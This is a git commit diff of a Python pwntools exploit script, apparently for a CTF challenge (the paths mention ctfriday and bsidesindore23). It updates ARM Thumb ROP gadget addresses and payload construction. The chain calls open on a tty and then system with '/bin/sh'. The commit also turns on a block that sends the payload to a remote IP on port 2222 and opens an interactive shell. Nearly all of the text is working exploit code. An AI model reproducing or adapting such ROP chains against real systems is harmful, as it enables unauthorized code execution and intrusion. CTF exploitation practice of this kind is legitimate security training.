abc74720db37a70ebc78d23c892778405f89597e
Sophie Friedrich <dev@flowerpot.me>
2023-06-17 10:16:05 +0200

    (locally) working rop for new binary
    Signed-off-by: Sophie Friedrich <dev@flowerpot.me>

--- heldentat.py
+++ heldentat.py
@@ -5,23 +5,24 @@ import os
 context.binary = "./main_fixed"
 
 # rops
-rop_r1_t_adr = 0x0004407c  # ; pop {r1, pc} !thumb
-rop_mov_r0_r8_t_adr = 0x00020ca8  # ; mov r0,r8 / add sp,#0x8 / pop.w {r4, r5, r6, r7, r8, r9, r10, pc}
-rop_add_sp_0xc_t_adr = 0x000147b4  # ; add sp,0xc / pop {r4, r5, r6, r7, pc}
-rop_add_r0_r4_t_adr = 0x0002602a  # ; add r0, r4 / pop {r4, pc}
+rop_r1_t_adr = 0x0003777e # ; pop {r1, pc} !thumb
+rop_mov_r0_r6_t_adr = 0x00010d2c  # ; mov r0,r6 / pop {r4, r5, r6, pc}
 
-rop_lr_adr = 0x0003df1c  # ; pop {r4, r6, r7, fp, ip, lr, pc}
-rop_bx_lr_adr = 0x00018108  # ; bx lr
-rop_mov_r0_r1_t_adr = 0x00025a24  # ; mov r0 r1 / bx lr
+rop_add_sp_0xc_t_adr = 0x00014532  # ; add sp,#0xc / pop {r4, r5, pc}
+rop_add_sp_0x28_t_adr = 0x00040380  # ; add sp, #0x28 ; pop {r4, pc}
 
-rop_open_t_adr = 0x00026c2c  # open
-rop_system_t_adr = 0x000111fc  # system
-rop_sice_t_adr = 0x00010440  # sice
+rop_pop_lr_t_adr = 0x00045f5a  # ; pop.w {r4, lr} / nop.w / pop {r4, pc}
 
-rop_set_r0_t_adr = 0x00014d88 # ; pop {r0, r6, pc}
+rop_mov_r0_r1_t_adr = 0x00022fde  # ; mov r0 r1 / bx lr
 
-location_bin_sh = 0x0004a3b4  # string "/bin/sh"
-location_date = 0x0004a2e0  # string "date +'%s'"
+rop_open_t_adr = 0x00021dac  # open
+rop_system_t_adr = 0x00014c10  # system
+rop_sice_t_adr = 0x00010424  # sice
+
+rop_set_r0_t_adr = 0x00034f6c  # ; pop {r0, r6, pc}
+
+location_bin_sh = 0x0004b004  # string "/bin/sh"
+location_date = 0x0004ab60  # string "date +'%s'"
 
 """
 What I want to have
@@ -56,28 +57,35 @@ What happens in the binary:
 
 How the rop chain works:
 
+1. set r1 to 2 (RW)
+2. use r6 as pointer into stack -> need to mov it into r0
+3. (overflow might not be required anymore)
+4. call open and use gadget to move sp by 0xc bytes
+    a. move r1 into r0
+    b. set r1 to 2
+    c. repeat
+5. call system with bin_sh location
+
 """
 
-def build_lr(r4, r6, r7, fp, ip, lr):
-    payload = p32(rop_lr_adr)
-    payload += p32(r4) + p32(r6) + p32(r7) + p32(fp) + p32(ip)
-    payload += p32(lr)
+def build_lr(lr, r4=0):
+    payload = p32(rop_pop_lr_t_adr + 1)
+    payload += p32(0) + p32(lr) + p32(r4)
     return payload
 
-def build_mov_r0_r8_t(r4, r5, r6, r7, r8, r9, r10):
-    payload = p32(rop_mov_r0_r8_t_adr + 1)
-    payload += b"0" * 8
-    payload += p32(r4) + p32(r5) + p32(r6) + p32(r7) + p32(r8) + p32(r9) + p32(r10)
+def build_mov_r0_r6_t(r4, r5, r6):
+    payload = p32(rop_mov_r0_r6_t_adr + 1)
+    payload += p32(r4) + p32(r5) + p32(r6)
     return payload
 
 def mov_r0_r1_t(pc):
-    payload = build_lr(0, 0, 0, 0, 0, pc)
+    payload = build_lr(lr=pc)
     payload += p32(rop_mov_r0_r1_t_adr + 1)
     return payload
 
 def call_open_t(next_pc):
     # set lr to next instruction after open
-    payload = build_lr(0, 0, 0, 0, 0, next_pc)
+    payload = build_lr(lr=next_pc)
     payload += p32(rop_open_t_adr + 1)  # do open once
     return payload
 
@@ -95,52 +103,54 @@ if True:
     payload += b"1" * 4
 
     # trying to execute rop_r1_t_adr in thumb mode
-    payload += build_lr(0, 0, 0, 0, 0, rop_r1_t_adr + 1)
-    payload += p32(rop_bx_lr_adr)
-
+    payload += p32(rop_r1_t_adr + 1)
     # write to r1
-    payload += p32(os.O_RDONLY)
+    payload += p32(os.O_RDWR)
 
-    r4_overflow = 0xFFFFFFFF - (len(tty_path) + 2) + 1  # overflow provocing
-    # move r8 to r0
-    payload += build_mov_r0_r8_t(r4_overflow, 0, 0, 0, 0, 0, 0)
+    # move r6 to r0
+    payload += build_mov_r0_r6_t(0, 0, 0)
 
-    # subtract from r0
-    payload += p32(rop_add_r0_r4_t_adr + 1)
-    payload += p32(0)  # r4
+    payload += p32(rop_add_sp_0x28_t_adr + 1)
+    prev_len = len(payload)
+
+    payload += b"0" * (40 - (len(payload) - 0x20))
+    payload += tty_path
+    payload += b"0" * ((prev_len + 0x28) - len(payload) + 4)
+
+    payload += p32(rop_add_sp_0x28_t_adr + 1)
+    payload += b"0" * 0x28
+    payload += b"0" * (4)  # for add sp (2 args)
 
     # do open
-    payload += call_open_t(rop_add_sp_0xc_t_adr + 1)
-
-    # open uses 16bytes of stack, reserve it
-    payload += b"0" * 0xc
+    payload += call_open_t(rop_add_sp_0x28_t_adr + 1)
+    payload += b"0" * 0x28
 
     # move r1 to r0 and set r1 = O_RDRW
-    payload += b"0" * (4 * 4) # for add sp
+    payload += b"0" * (4)  # for add sp (2 args)
     payload += mov_r0_r1_t(rop_r1_t_adr + 1)
     payload += p32(os.O_WRONLY)
 
-    payload += call_open_t(rop_add_sp_0xc_t_adr + 1)
-    # open uses 16bytes of stack, reserve it
-    payload += b"0" * 0xc
-    payload += b"0" * (4 * 4)  # for add sp
+    # payload += call_open_t(rop_add_sp_0x28_t_adr + 1)
+    # # open uses 16bytes of stack, reserve it
+    # payload += b"0" * 0x28
+    # payload += b"0" * (4)  # for add sp (2 args)
 
-    payload += mov_r0_r1_t(rop_r1_t_adr + 1)
-    payload += p32(os.O_WRONLY)
+    # payload += mov_r0_r1_t(rop_r1_t_adr + 1)
+    # payload += p32(os.O_WRONLY)
 
-    payload += call_open_t(rop_add_sp_0xc_t_adr + 1)
+    payload += call_open_t(rop_add_sp_0x28_t_adr + 1)
     # open uses 16bytes of stack, reserve it
-    payload += b"0" * 0xc
-    payload += b"0" * (4 * 4)  # for add sp
+    payload += b"0" * 0x28
+    payload += b"0" * (4)  # for add sp (two args)
 
     # NOW WE CAN USE ROP TO CALL SYSTEM !!!!!!! (I'm so tired)
     payload += build_set_r0(location_bin_sh, 0)
     payload += p32(rop_system_t_adr + 1)
-    assert len(payload) < (404 - len(tty_path) - 2)
-    payload += b"0" * (404 - len(payload) - len(tty_path) - 2)
+    print(len(payload))
 
-    payload += tty_path
     print(f"Payload Length: 0x{len(payload):x}")
+
+    assert(len(payload) < 340)
 else:
     payload = b"0" * 0x192
     # with 0x200 bytes calls to system don't resolve
@@ -149,9 +159,7 @@ with open("/local-tmp/payload", "bw") as fp:
     fp.write(payload + b"\n")
     fp.write(b"ls")
 
-# exit()
-
-if False:
+if True:
     r = remote("34.125.56.151", 2222, ssl=False)
     r.sendline(payload)
     r.interactive()
@@ -159,11 +167,9 @@ if False:
 
 io = gdb.debug(context.binary.path, gdbscript="""
 source /home/elizabeth/Documents/Projects/ccc/ctfriday-bsidesindore23/pwndbg/gdbinit.py
-# b vuln
-b *0x00026c2c
-b *0x0004407c
-# b *0x000104da
+b *0x00021dac
 b *0x010488
+b *0x00014c10
 c
 """)
 #io = process(context.binary.path)
